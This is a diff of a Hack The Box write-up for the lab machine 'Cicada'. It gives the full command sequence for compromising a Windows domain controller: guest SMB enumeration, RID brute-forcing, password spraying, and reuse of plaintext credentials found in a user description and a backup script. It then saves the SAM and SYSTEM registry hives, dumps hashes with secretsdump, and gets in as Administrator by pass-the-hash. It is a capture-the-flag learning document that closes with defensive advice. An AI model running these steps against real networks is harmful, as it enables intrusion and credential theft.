@@ -1,3 +1,5 @@
+# HTB - Cicada
+
 **IP Address:** `10.10.11.35`  
 **OS:** Windows Server 2022  
 **Difficulty:** Easy  
@@ -32,7 +34,7 @@ This privilege allows the extraction of the **SAM** and **SYSTEM** registry hive
 
 We start by verifying whether the target is alive using an ICMP echo request:
 
-``` bash
+```bash
 ping -c 1 10.10.11.35
 ```
 
@@ -46,7 +48,7 @@ The host responds, confirming it is reachable and ready for further enumeration.
 
 We perform a full TCP port scan to identify all open services on the target:
 
-``` bash
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.35 -oG allPorts
 ```
 
@@ -63,7 +65,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.35 -oG allPorts
 
 Once completed, we extract the open ports into a variable for targeted scanning:
 
-``` bash
+```bash
 extractPorts allPorts
 ```
 
@@ -75,7 +77,7 @@ extractPorts allPorts
 
 Using the open ports obtained from the previous step, we run a targeted Nmap scan with service/version detection and default NSE scripts:
 
-``` bash
+```bash
 nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63646 10.10.11.35 -oN targeted
 ```
 
@@ -106,14 +108,13 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63646 10.10.11.35 -
 The presence of **Kerberos (88)**, **LDAP/LDAPS (389, 636)**, and **SMB (445)** confirms that the target is a **Windows Domain Controller**.
 
 ---
-
 ## 2. SMB Enumeration
 
 ### 2.1 Checking SMB Shares (Unauthenticated)
 
 We start by enumerating SMB shares without credentials:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 --shares
 ```
 
@@ -127,7 +128,7 @@ No relevant information is retrieved. This suggests that anonymous access is res
 
 We then attempt a null session connection using `smbclient`:
 
-``` bash
+```bash
 smbclient -L 10.10.11.35 -N
 ```
 
@@ -141,7 +142,7 @@ Some shares are visible, including `HR`.
 
 Since `guest` access is sometimes enabled on internal networks, we retry with the `guest` account and no password:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'guest' -p '' --shares
 ```
 
@@ -155,7 +156,7 @@ netexec smb 10.10.11.35 -u 'guest' -p '' --shares
 
 To view detailed permissions, we use `smbmap`:
 
-``` bash
+```bash
 smbmap -H 10.10.11.35 -u 'guest' -p ''
 ```
 
@@ -169,7 +170,7 @@ Most shares are inaccessible except for `HR` and `IPC$`.
 
 We recursively list the contents of the `HR` share:
 
-``` bash
+```bash
 smbmap -H 10.10.11.35 -u 'guest' -p '' -r HR
 ```
 
@@ -183,7 +184,7 @@ We find a file named `Notice_from_HR.txt`.
 
 We connect via `smbclient` to download the file:
 
-``` bash
+```bash
 smbclient //10.10.11.35/HR -N 
 get "Notice from HR.txt" 
 cat Notice\ from\ HR.txt
@@ -208,7 +209,7 @@ We save it into a file named `credentials.txt` for later use.
 
 As we still do not have a valid username, we enumerate users by brute-forcing RIDs:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
 ```
 
@@ -216,7 +217,7 @@ netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
 
 We clean the output:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' > users.txt
 cat users.txt
 ```
@@ -225,7 +226,7 @@ cat users.txt
 
 We can further clean this list and keep only the final usernames with:
 
-``` bash
+```bash
 cat users.txt | tr '\\' ' ' | awk '{print $7}' > users_clean.txt
 cat users_clean.txt
 ```
@@ -238,7 +239,7 @@ cat users_clean.txt
 
 We confirm which accounts are valid in the domain:
 
-``` bash
+```bash
 kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
 ```
 
@@ -252,7 +253,7 @@ kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
 
 We test the recovered password against all valid users:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u users_clean.txt -p credentials.txt
 ```
 
@@ -261,14 +262,13 @@ netexec smb 10.10.11.35 -u users_clean.txt -p credentials.txt
 The password matches the account `michael.wrightson`.
 
 ---
-
 ## 3. Foothold
 
 ### 3.1 Testing WinRM Access
 
 We check whether `michael.wrightson` has WinRM access:
 
-``` bash
+```bash
 netexec winrm 10.10.11.35 -u 'michael.wrightson' -p credentials.txt
 ```
 
@@ -282,7 +282,7 @@ WinRM is disabled for this account.
 
 We list accessible shares for this user:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --shares
 ```
 
@@ -298,7 +298,7 @@ Two additional shares, `NETLOGON` and `SYSVOL`, are visible but contain no usefu
 
 We switch enumeration mode to `--users` to retrieve user descriptions:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --users
 ```
 
@@ -315,7 +315,7 @@ The account `david.orelious` has his password stored in the description field:
 
 We confirm the credentials:
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
 
@@ -328,7 +328,7 @@ The login is successful.
 
 ### 3.5 Checking WinRM for David
 
-``` bash
+```bash
 netexec winrm 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
 
@@ -341,7 +341,7 @@ WinRM is also disabled for this account.
 
 ### 3.6 Enumerating Shares for David
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
 ```
 
@@ -356,7 +356,7 @@ David has access to the `DEV` share in addition to the previously seen shares.
 
 We recursively list the contents of the `DEV` share:
 
-``` bash
+```bash
 smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV
 ```
 
@@ -371,7 +371,7 @@ A file named `Backup_script.ps1` is present.
 
 We download and inspect the file:
 
-``` bash
+```bash
 smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' 
 get "Backup_script.ps1" 
 cat Backup_script.ps1
@@ -388,7 +388,7 @@ The script contains plaintext credentials for another account:
 
 ### 3.9 Checking SMB and WinRM for Emily
 
-``` bash
+```bash
 netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 netexec winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
@@ -402,7 +402,7 @@ Successful.
 
 We confirm that `emily.oscars` has WinRM access and open a remote PowerShell session:
 
-``` bash
+```bash
 evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
@@ -411,7 +411,6 @@ evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 We obtain an interactive shell on the target and retrieve the **user flag** from the desktop.
 
 ---
-
 ## 4. Privilege Escalation
 
 ### 4.1 Checking Current Privileges
@@ -420,7 +419,7 @@ We obtain an interactive shell on the target and retrieve the **user flag** from
 
 Once connected as `emily.oscars`, we check the assigned privileges:
 
-``` bash
+```bash
 net user emily.oscars
 whoami /priv
 ```
@@ -437,7 +436,7 @@ This privilege allows us to back up system hives, which can be used to extract c
 
 We save the `SAM` and `SYSTEM` registry hives to a temporary directory on the target:
 
-``` bash
+```bash
 reg save hklm\sam C:\temp\sam.hive 
 reg save hklm\system C:\temp\system.hive
 ```
@@ -450,7 +449,7 @@ reg save hklm\system C:\temp\system.hive
 
 We transfer both files to our local machine:
 
-``` bash
+```bash
 download sam.hive 
 download system.hive
 ```
@@ -461,7 +460,7 @@ download system.hive
 
 We use `impacket-secretsdump` locally to dump the NTLM hashes from the extracted hives:
 
-``` bash
+```bash
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
@@ -478,7 +477,7 @@ We recover the **Administrator** NTLM hash:
 
 We reuse the NTLM hash to authenticate as the `Administrator` account via Evil-WinRM:
 
-``` bash
+```bash
 evil-winrm -i 10.10.11.35 -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
 ```
 
@@ -490,7 +489,6 @@ We gain a privileged shell and retrieve the **root flag** from the Administrator
 # ✅ MACHINE COMPLETE
 
 ---
-
 ## Summary of Exploitation Path
 
 1. **SMB Null Session** → Access to `HR` share with default password.
@@ -502,7 +500,6 @@ We gain a privileged shell and retrieve the **root flag** from the Administrator
 7. **Pass-the-Hash** → Full domain compromise.
 
 ---
-
 ## Defensive Recommendations
 
 - **Restrict anonymous SMB access** and disable null sessions to prevent unauthenticated share enumeration.
